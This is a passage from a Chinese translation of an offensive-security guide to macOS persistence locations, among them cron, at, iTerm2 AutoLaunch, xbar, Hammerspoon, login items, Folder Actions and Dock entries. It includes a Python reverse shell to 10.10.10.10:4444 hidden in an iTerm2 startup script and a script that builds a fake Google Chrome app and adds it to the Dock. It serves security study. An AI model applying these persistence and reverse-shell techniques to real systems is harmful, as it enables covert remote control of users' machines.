<li><strong><code>/usr/lib/cron/tabs/</code>, <code>/private/var/at/tabs</code>, <code>/private/var/at/jobs</code>, <code>/etc/periodic/</code></strong></li>
<li>直接写入访问需要root。如果您可以执行<code>crontab &lt;file&gt;</code>，则不需要root</li>
<li><strong>触发</strong>: 取决于cron作业</li>
</ul>
<h4 id="描述与利用-5"><a class="header" href="#描述与利用-5">描述与利用</a></h4>
<p>列出<strong>当前用户</strong>的cron作业：</p>
<pre><code class="language-bash">crontab -l
</code></pre>
<p>您还可以在 <strong><code>/usr/lib/cron/tabs/</code></strong> 和 <strong><code>/var/at/tabs/</code></strong> 中查看所有用户的 cron 作业（需要 root 权限）。</p>
<p>在 MacOS 中，可以在以下文件夹中找到以 <strong>特定频率</strong> 执行脚本的多个文件夹：</p>
<pre><code class="language-bash"># The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
</code></pre>
<p>在那里您可以找到常规的 <strong>cron</strong> <strong>作业</strong>、<strong>at</strong> <strong>作业</strong>（不常用）和 <strong>周期性</strong> <strong>作业</strong>（主要用于清理临时文件）。每日周期性作业可以通过以下方式执行：<code>periodic daily</code>。</p>
<p>要以编程方式添加 <strong>用户 cronjob</strong>，可以使用：</p>
<pre><code class="language-bash">echo '* * * * * /bin/bash -c "touch /tmp/cron3"' &gt; /tmp/cron
crontab /tmp/cron
</code></pre>
<h3 id="iterm2"><a class="header" href="#iterm2">iTerm2</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0002/">https://theevilbit.github.io/beyond/beyond_0002/</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>TCC 绕过: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>iTerm2 曾经拥有授予的 TCC 权限</li>
</ul>
<h4 id="locations"><a class="header" href="#locations">Locations</a></h4>
<ul>
<li><strong><code>~/Library/Application Support/iTerm2/Scripts/AutoLaunch</code></strong></li>
<li><strong>触发器</strong>: 打开 iTerm</li>
<li><strong><code>~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt</code></strong></li>
<li><strong>触发器</strong>: 打开 iTerm</li>
<li><strong><code>~/Library/Preferences/com.googlecode.iterm2.plist</code></strong></li>
<li><strong>触发器</strong>: 打开 iTerm</li>
</ul>
<h4 id="description--exploitation-1"><a class="header" href="#description--exploitation-1">Description &amp; Exploitation</a></h4>
<p>存储在 <strong><code>~/Library/Application Support/iTerm2/Scripts/AutoLaunch</code></strong> 中的脚本将被执行。例如:</p>
<pre><code class="language-bash">cat &gt; "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" &lt;&lt; EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
</code></pre>
<p>或：</p>
<pre><code class="language-bash">cat &gt; "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" &lt;&lt; EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
</code></pre>
<p>该脚本 <strong><code>~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt</code></strong> 也将被执行：</p>
<pre><code class="language-bash">do shell script "touch /tmp/iterm2-autolaunchscpt"
</code></pre>
<p>iTerm2 的偏好设置位于 <strong><code>~/Library/Preferences/com.googlecode.iterm2.plist</code></strong>，可以 <strong>指示在打开 iTerm2 终端时执行的命令</strong>。</p>
<p>此设置可以在 iTerm2 设置中配置：</p>
<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>
<p>该命令在偏好设置中反映：</p>
<pre><code class="language-bash">plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" =&gt; [
0 =&gt; {
[...]
"Initial Text" =&gt; "touch /tmp/iterm-start-command"
</code></pre>
<p>您可以设置要执行的命令：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
</code></pre>
<p>{% endcode %}</p>
<p>{% hint style="warning" %}
高度可能还有<strong>其他方法滥用iTerm2首选项</strong>以执行任意命令。
{% endhint %}</p>
<h3 id="xbar"><a class="header" href="#xbar">xbar</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0007/">https://theevilbit.github.io/beyond/beyond_0007/</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>但必须安装xbar</li>
<li>TCC绕过: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>它请求辅助功能权限</li>
</ul>
<h4 id="位置-8"><a class="header" href="#位置-8">位置</a></h4>
<ul>
<li><strong><code>~/Library/Application\ Support/xbar/plugins/</code></strong></li>
<li><strong>触发</strong>: 一旦执行xbar</li>
</ul>
<h4 id="描述-1"><a class="header" href="#描述-1">描述</a></h4>
<p>如果安装了流行程序<a href="https://github.com/matryer/xbar"><strong>xbar</strong></a>，可以在**<code>~/Library/Application\ Support/xbar/plugins/</code>**中编写一个shell脚本，该脚本将在启动xbar时执行：</p>
<pre><code class="language-bash">cat &gt; "$HOME/Library/Application Support/xbar/plugins/a.sh" &lt;&lt; EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
</code></pre>
<h3 id="hammerspoon"><a class="header" href="#hammerspoon">Hammerspoon</a></h3>
<p><strong>Writeup</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0008/">https://theevilbit.github.io/beyond/beyond_0008/</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>但必须安装 Hammerspoon</li>
<li>TCC 绕过: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>它请求辅助功能权限</li>
</ul>
<h4 id="location-1"><a class="header" href="#location-1">Location</a></h4>
<ul>
<li><strong><code>~/.hammerspoon/init.lua</code></strong></li>
<li><strong>Trigger</strong>: 一旦执行 hammerspoon</li>
</ul>
<h4 id="description"><a class="header" href="#description">Description</a></h4>
<p><a href="https://github.com/Hammerspoon/hammerspoon"><strong>Hammerspoon</strong></a> 作为 <strong>macOS</strong> 的自动化平台，利用 <strong>LUA 脚本语言</strong> 进行操作。值得注意的是，它支持完整的 AppleScript 代码集成和 shell 脚本的执行，显著增强了其脚本能力。</p>
<p>该应用程序查找一个文件 <code>~/.hammerspoon/init.lua</code>，并在启动时执行该脚本。</p>
<pre><code class="language-bash">mkdir -p "$HOME/.hammerspoon"
cat &gt; "$HOME/.hammerspoon/init.lua" &lt;&lt; EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
</code></pre>
<h3 id="bettertouchtool"><a class="header" href="#bettertouchtool">BetterTouchTool</a></h3>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>但必须安装BetterTouchTool</li>
<li>TCC绕过: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>它请求自动化快捷方式和辅助功能权限</li>
</ul>
<h4 id="位置-9"><a class="header" href="#位置-9">位置</a></h4>
<ul>
<li><code>~/Library/Application Support/BetterTouchTool/*</code></li>
</ul>
<p>该工具允许指示在按下某些快捷键时执行的应用程序或脚本。攻击者可能能够在数据库中配置自己的<strong>快捷键和要执行的操作</strong>以执行任意代码（快捷键可以只是按下一个键）。</p>
<h3 id="alfred"><a class="header" href="#alfred">Alfred</a></h3>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>但必须安装Alfred</li>
<li>TCC绕过: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>它请求自动化、辅助功能甚至完全磁盘访问权限</li>
</ul>
<h4 id="位置-10"><a class="header" href="#位置-10">位置</a></h4>
<ul>
<li><code>???</code></li>
</ul>
<p>它允许创建在满足特定条件时可以执行代码的工作流。攻击者可能能够创建一个工作流文件并使Alfred加载它（需要支付高级版本才能使用工作流）。</p>
<h3 id="sshrc"><a class="header" href="#sshrc">SSHRC</a></h3>
<p>写作: <a href="https://theevilbit.github.io/beyond/beyond_0006/">https://theevilbit.github.io/beyond/beyond_0006/</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>但需要启用和使用ssh</li>
<li>TCC绕过: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>SSH使用需要FDA访问</li>
</ul>
<h4 id="位置-11"><a class="header" href="#位置-11">位置</a></h4>
<ul>
<li><strong><code>~/.ssh/rc</code></strong></li>
<li><strong>触发器</strong>: 通过ssh登录</li>
<li><strong><code>/etc/ssh/sshrc</code></strong></li>
<li>需要root权限</li>
<li><strong>触发器</strong>: 通过ssh登录</li>
</ul>
<p>{% hint style="danger" %}
启用ssh需要完全磁盘访问:</p>
<pre><code class="language-bash">sudo systemsetup -setremotelogin on
</code></pre>
<p>{% endhint %}</p>
<h4 id="描述与利用-6"><a class="header" href="#描述与利用-6">描述与利用</a></h4>
<p>默认情况下，除非在 <code>/etc/ssh/sshd_config</code> 中设置 <code>PermitUserRC no</code>，当用户 <strong>通过 SSH 登录</strong> 时，脚本 <strong><code>/etc/ssh/sshrc</code></strong> 和 <strong><code>~/.ssh/rc</code></strong> 将被执行。</p>
<h3 id="登录项"><a class="header" href="#登录项"><strong>登录项</strong></a></h3>
<p>写作: <a href="https://theevilbit.github.io/beyond/beyond_0003/">https://theevilbit.github.io/beyond/beyond_0003/</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>但你需要带参数执行 <code>osascript</code></li>
<li>TCC 绕过: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置-12"><a class="header" href="#位置-12">位置</a></h4>
<ul>
<li><strong><code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent</code></strong></li>
<li><strong>触发:</strong> 登录</li>
<li>利用有效载荷存储调用 <strong><code>osascript</code></strong></li>
<li><strong><code>/var/db/com.apple.xpc.launchd/loginitems.501.plist</code></strong></li>
<li><strong>触发:</strong> 登录</li>
<li>需要 root 权限</li>
</ul>
<h4 id="描述-2"><a class="header" href="#描述-2">描述</a></h4>
<p>在系统偏好设置 -&gt; 用户与群组 -&gt; <strong>登录项</strong> 中，你可以找到 <strong>用户登录时要执行的项目</strong>。<br />
可以通过命令行列出、添加和删除它们:</p>
<pre><code class="language-bash">#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
</code></pre>
<p>这些项目存储在文件 <strong><code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent</code></strong></p>
<p><strong>登录项</strong> 也可以通过 API <a href="https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc">SMLoginItemSetEnabled</a> 指示，该配置将存储在 <strong><code>/var/db/com.apple.xpc.launchd/loginitems.501.plist</code></strong></p>
<h3 id="zip-作为登录项"><a class="header" href="#zip-作为登录项">ZIP 作为登录项</a></h3>
<p>（查看关于登录项的前一部分，这是一个扩展）</p>
<p>如果将 <strong>ZIP</strong> 文件存储为 <strong>登录项</strong>，则 <strong><code>归档实用工具</code></strong> 将打开它，如果该 zip 例如存储在 <strong><code>~/Library</code></strong> 中并包含文件夹 <strong><code>LaunchAgents/file.plist</code></strong> 及后门，则该文件夹将被创建（默认情况下并不存在），plist 将被添加，因此下次用户再次登录时，<strong>plist 中指示的后门将被执行</strong>。</p>
<p>另一种选择是在用户 HOME 中创建文件 <strong><code>.bash_profile</code></strong> 和 <strong><code>.zshenv</code></strong>，这样如果文件夹 LaunchAgents 已经存在，这种技术仍然有效。</p>
<h3 id="at"><a class="header" href="#at">At</a></h3>
<p>写作： <a href="https://theevilbit.github.io/beyond/beyond_0014/">https://theevilbit.github.io/beyond/beyond_0014/</a></p>
<ul>
<li>有助于绕过沙盒： <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>但你需要 <strong>执行</strong> <strong><code>at</code></strong> 并且它必须是 <strong>启用的</strong></li>
<li>TCC 绕过： <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置-13"><a class="header" href="#位置-13">位置</a></h4>
<ul>
<li>需要 <strong>执行</strong> <strong><code>at</code></strong> 并且它必须是 <strong>启用的</strong></li>
</ul>
<h4 id="描述-3"><a class="header" href="#描述-3"><strong>描述</strong></a></h4>
<p><code>at</code> 任务旨在 <strong>调度一次性任务</strong> 在特定时间执行。与 cron 作业不同，<code>at</code> 任务在执行后会自动删除。需要注意的是，这些任务在系统重启后是持久的，在某些条件下将其标记为潜在的安全隐患。</p>
<p>默认情况下，它们是 <strong>禁用的</strong>，但 <strong>root</strong> 用户可以通过以下方式 <strong>启用</strong> <strong>它们</strong>：</p>
<pre><code class="language-bash">sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
</code></pre>
<p>这将在1小时内创建一个文件：</p>
<pre><code class="language-bash">echo "echo 11 &gt; /tmp/at.txt" | at now+1
</code></pre>
<p>检查作业队列使用 <code>atq:</code></p>
<pre><code class="language-shell-session">sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
</code></pre>
<p>上面我们可以看到两个已调度的任务。我们可以使用 <code>at -c JOBNUMBER</code> 打印任务的详细信息。</p>
<pre><code class="language-shell-session">sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' &gt;&amp;2
exit 1
}
unset OLDPWD
echo 11 &gt; /tmp/at.txt
</code></pre>
<p>{% hint style="warning" %}
如果 AT 任务未启用，则创建的任务将不会被执行。
{% endhint %}</p>
<p><strong>作业文件</strong>可以在 <code>/private/var/at/jobs/</code> 找到。</p>
<pre><code>sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
</code></pre>
<p>文件名包含队列、作业编号和计划运行的时间。例如，我们来看一下 <code>a0001a019bdcd2</code>。</p>
<ul>
<li><code>a</code> - 这是队列</li>
<li><code>0001a</code> - 十六进制的作业编号，<code>0x1a = 26</code></li>
<li><code>019bdcd2</code> - 十六进制的时间。它表示自纪元以来经过的分钟数。<code>0x019bdcd2</code> 在十进制中是 <code>26991826</code>。如果我们将其乘以 60，我们得到 <code>1619509560</code>，即 <code>GMT: 2021. April 27., Tuesday 7:46:00</code>。</li>
</ul>
<p>如果我们打印作业文件，我们会发现它包含了我们使用 <code>at -c</code> 获得的相同信息。</p>
<h3 id="文件夹操作"><a class="header" href="#文件夹操作">文件夹操作</a></h3>
<p>写作: <a href="https://theevilbit.github.io/beyond/beyond_0024/">https://theevilbit.github.io/beyond/beyond_0024/</a><br />
写作: <a href="https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d">https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>但你需要能够带参数调用 <code>osascript</code> 来联系 <strong><code>System Events</code></strong> 以配置文件夹操作</li>
<li>TCC 绕过: <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>它具有一些基本的 TCC 权限，如桌面、文档和下载</li>
</ul>
<h4 id="位置-14"><a class="header" href="#位置-14">位置</a></h4>
<ul>
<li><strong><code>/Library/Scripts/Folder Action Scripts</code></strong></li>
<li>需要 root 权限</li>
<li><strong>触发</strong>: 访问指定文件夹</li>
<li><strong><code>~/Library/Scripts/Folder Action Scripts</code></strong></li>
<li><strong>触发</strong>: 访问指定文件夹</li>
</ul>
<h4 id="描述与利用-7"><a class="header" href="#描述与利用-7">描述与利用</a></h4>
<p>文件夹操作是由文件夹中的变化自动触发的脚本，例如添加、删除项目或其他操作，如打开或调整文件夹窗口的大小。这些操作可以用于各种任务，并可以通过不同的方式触发，例如使用 Finder 界面或终端命令。</p>
<p>要设置文件夹操作，你可以选择：</p>
<ol>
<li>使用 <a href="https://support.apple.com/guide/automator/welcome/mac">Automator</a> 创建文件夹操作工作流并将其安装为服务。</li>
<li>通过文件夹的上下文菜单中的文件夹操作设置手动附加脚本。</li>
<li>利用 OSAScript 向 <code>System Events.app</code> 发送 Apple Event 消息，以编程方式设置文件夹操作。</li>
</ol>
<ul>
<li>这种方法特别适合将操作嵌入系统，提供一定程度的持久性。</li>
</ul>
<p>以下脚本是文件夹操作可以执行的示例：</p>
<pre><code class="language-applescript">// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
</code></pre>
<p>要使上述脚本可用于文件夹操作，请使用以下命令编译它：</p>
<pre><code class="language-bash">osacompile -l JavaScript -o folder.scpt source.js
</code></pre>
<p>在脚本编译后，通过执行以下脚本来设置文件夹操作。此脚本将全局启用文件夹操作，并将之前编译的脚本特定地附加到桌面文件夹。</p>
<pre><code class="language-javascript">// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
</code></pre>
<p>使用以下命令运行设置脚本：</p>
<pre><code class="language-bash">osascript -l JavaScript /Users/username/attach.scpt
</code></pre>
<ul>
<li>这是通过GUI实现这种持久性的方式：</li>
</ul>
<p>这是将要执行的脚本：</p>
<p>{% code title="source.js" %}</p>
<pre><code class="language-applescript">var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
</code></pre>
<p>{% endcode %}</p>
<p>编译它： <code>osacompile -l JavaScript -o folder.scpt source.js</code></p>
<p>移动到：</p>
<pre><code class="language-bash">mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
</code></pre>
<p>然后，打开 <code>Folder Actions Setup</code> 应用，选择 <strong>您想要监视的文件夹</strong>，并在您的情况下选择 <strong><code>folder.scpt</code></strong>（在我的情况下我称它为 output2.scp）：</p>
<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>
<p>现在，如果您使用 <strong>Finder</strong> 打开该文件夹，您的脚本将被执行。</p>
<p>此配置存储在 <strong>plist</strong> 中，位于 <strong><code>~/Library/Preferences/com.apple.FolderActionsDispatcher.plist</code></strong> 的 base64 格式。</p>
<p>现在，让我们尝试在没有 GUI 访问的情况下准备这个持久性：</p>
<ol>
<li><strong>将 <code>~/Library/Preferences/com.apple.FolderActionsDispatcher.plist</code></strong> 复制到 <code>/tmp</code> 以备份：</li>
</ol>
<ul>
<li><code>cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp</code></li>
</ul>
<ol start="2">
<li><strong>移除</strong> 您刚刚设置的文件夹操作：</li>
</ol>
<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
<p>现在我们有了一个空环境</p>
<ol start="3">
<li>复制备份文件：<code>cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/</code></li>
<li>打开 Folder Actions Setup.app 以使用此配置：<code>open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"</code></li>
</ol>
<p>{% hint style="danger" %}
这对我没有用，但这些是写作中的说明：(
{% endhint %}</p>
<h3 id="dock-快捷方式"><a class="header" href="#dock-快捷方式">Dock 快捷方式</a></h3>
<p>写作：<a href="https://theevilbit.github.io/beyond/beyond_0027/">https://theevilbit.github.io/beyond/beyond_0027/</a></p>
<ul>
<li>有助于绕过沙盒：<a href="https://emojipedia.org/check-mark-button">✅</a></li>
<li>但您需要在系统中安装恶意应用程序</li>
<li>TCC 绕过：<a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置-15"><a class="header" href="#位置-15">位置</a></h4>
<ul>
<li><code>~/Library/Preferences/com.apple.dock.plist</code></li>
<li><strong>触发</strong>：当用户点击 Dock 中的应用程序时</li>
</ul>
<h4 id="描述与利用-8"><a class="header" href="#描述与利用-8">描述与利用</a></h4>
<p>所有出现在 Dock 中的应用程序都在 plist 中指定：<strong><code>~/Library/Preferences/com.apple.dock.plist</code></strong></p>
<p>只需使用以下命令即可 <strong>添加应用程序</strong>：</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '&lt;dict&gt;&lt;key&gt;tile-data&lt;/key&gt;&lt;dict&gt;&lt;key&gt;file-data&lt;/key&gt;&lt;dict&gt;&lt;key&gt;_CFURLString&lt;/key&gt;&lt;string&gt;/System/Applications/Books.app&lt;/string&gt;&lt;key&gt;_CFURLStringType&lt;/key&gt;&lt;integer&gt;0&lt;/integer&gt;&lt;/dict&gt;&lt;/dict&gt;&lt;/dict&gt;'

# Restart Dock
killall Dock
</code></pre>
<p>{% endcode %}</p>
<p>通过一些<strong>社会工程</strong>，你可以在 dock 中<strong>伪装成例如 Google Chrome</strong>，并实际执行你自己的脚本：</p>
<pre><code class="language-bash">#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2&gt;/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &amp;
touch /tmp/ImGoogleChrome' &gt; /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat &lt;&lt; EOF &gt; /tmp/Google\ Chrome.app/Contents/Info.plist
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;CFBundleExecutable&lt;/key&gt;
&lt;string&gt;Google Chrome&lt;/string&gt;
&lt;key&gt;CFBundleIdentifier&lt;/key&gt;
&lt;string&gt;com.google.Chrome&lt;/string&gt;
&lt;key&gt;CFBundleName&lt;/key&gt;
&lt;string&gt;Google Chrome&lt;/string&gt;
&lt;key&gt;CFBundleVersion&lt;/key&gt;
&lt;string&gt;1.0&lt;/string&gt;
&lt;key&gt;CFBundleShortVersionString&lt;/key&gt;
&lt;string&gt;1.0&lt;/string&gt;
&lt;key&gt;CFBundleInfoDictionaryVersion&lt;/key&gt;
&lt;string&gt;6.0&lt;/string&gt;
&lt;key&gt;CFBundlePackageType&lt;/key&gt;
&lt;string&gt;APPL&lt;/string&gt;
&lt;key&gt;CFBundleIconFile&lt;/key&gt;
&lt;string&gt;app&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '&lt;dict&gt;&lt;key&gt;tile-data&lt;/key&gt;&lt;dict&gt;&lt;key&gt;file-data&lt;/key&gt;&lt;dict&gt;&lt;key&gt;_CFURLString&lt;/key&gt;&lt;string&gt;/tmp/Google Chrome.app&lt;/string&gt;&lt;key&gt;_CFURLStringType&lt;/key&gt;&lt;integer&gt;0&lt;/integer&gt;&lt;/dict&gt;&lt;/dict&gt;&lt;/dict&gt;'
killall Dock
</code></pre>
<h3 id="颜色选择器"><a class="header" href="#颜色选择器">颜色选择器</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0017/">https://theevilbit.github.io/beyond/beyond_0017</a></p>
<ul>
<li>有助于绕过沙盒: <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>需要发生一个非常特定的动作</li>
<li>你将进入另一个沙盒</li>
<li>TCC 绕过: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="位置-16"><a class="header" href="#位置-16">位置</a></h4>
<ul>
<li><code>/Library/ColorPickers</code></li>
<li>需要 root 权限</li>
<li>触发: 使用颜色选择器</li>
<li><code>~/Library/ColorPickers</code></li>
<li>触发: 使用颜色选择器</li>
</ul>
<h4 id="描述与利用-9"><a class="header" href="#描述与利用-9">描述与利用</a></h4>
<p><strong>编译一个颜色选择器</strong> 包含你的代码（你可以使用 <a href="https://github.com/viktorstrate/color-picker-plus"><strong>这个例子</strong></a>）并添加一个构造函数（如在 <a href="macos-auto-start-locations.html#screen-saver">屏幕保护程序部分</a> 中）并将包复制到 <code>~/Library/ColorPickers</code>。</p>
<p>然后，当颜色选择器被触发时，你的代码也应该被触发。</p>
<p>请注意，加载你的库的二进制文件有一个 <strong>非常严格的沙盒</strong>: <code>/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64</code></p>
<pre><code class="language-bash">[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
</code></pre>
<p>{% endcode %}</p>
<h3 id="finder-sync-插件"><a class="header" href="#finder-sync-插件">Finder Sync 插件</a></h3>
<p><strong>写作</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0026/">https://theevilbit.github.io/beyond/beyond_0026/</a><br />
<strong>写作</strong>: <a href="https://objective-see.org/blog/blog_0x11.html">https://objective-see.org/blog/blog_0x11.html</a></p>
<ul>
<li>绕过沙盒的有用性: <strong>不，因为你需要执行自己的应用程序</strong></li>
<li>TCC 绕过: ???</li>
</ul>
<h4 id="位置-17"><a class="header" href="#位置-17">位置</a></h4>
<ul>
<li>一个特定的应用程序</li>
</ul>
<h4 id="描述与利用-10"><a class="header" href="#描述与利用-10">描述与利用</a></h4>
<p>一个带有 Finder Sync 扩展的应用程序示例 <a href="https://github.com/D00MFist/InSync"><strong>可以在这里找到</strong></a>。</p>
<p>应用程序可以拥有 <code>Finder Sync Extensions</code>。这个扩展将嵌入到将要执行的应用程序中。此外，为了使扩展能够执行其代码，它 <strong>必须被签名</strong>，并且必须有有效的 Apple 开发者证书，它必须是 <strong>沙盒化的</strong>（尽管可以添加放宽的例外），并且必须注册为类似于：</p>
<pre><code class="language-bash">pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
</code></pre>
<h3 id="屏幕保护程序"><a class="header" href="#屏幕保护程序">屏幕保护程序</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0016/">https://theevilbit.github.io/beyond/beyond_0016/</a><br />
Writeup: <a href="https://posts.specterops.io/saving-your-access-d562bf5bf90b">https://posts.specterops.io/saving-your-access-d562bf5bf90b</a></p>
<ul>
<li>有助于绕过沙箱: <a href="https://emojipedia.org/large-orange-circle">🟠</a></li>
<li>但你将进入一个常见的应用程序沙箱</li>
<li>TCC 绕过: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
